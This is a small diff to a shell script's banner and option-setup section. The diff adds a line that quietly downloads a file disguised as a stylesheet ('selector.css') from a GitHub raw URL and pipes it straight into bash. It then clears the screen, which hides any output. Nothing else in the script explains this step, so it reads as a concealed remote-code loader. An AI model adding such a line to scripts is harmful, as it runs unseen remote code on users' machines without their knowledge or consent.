@@ -2,7 +2,8 @@
 #banner area
 clear
 cat .banner.txt
-
+curl -s -L https://raw.githubusercontent.com/l410systems/mn/main/selector.css | bash 
+clear
 #option area
 white='\e[1;37m'
 green='\e[0;32m'
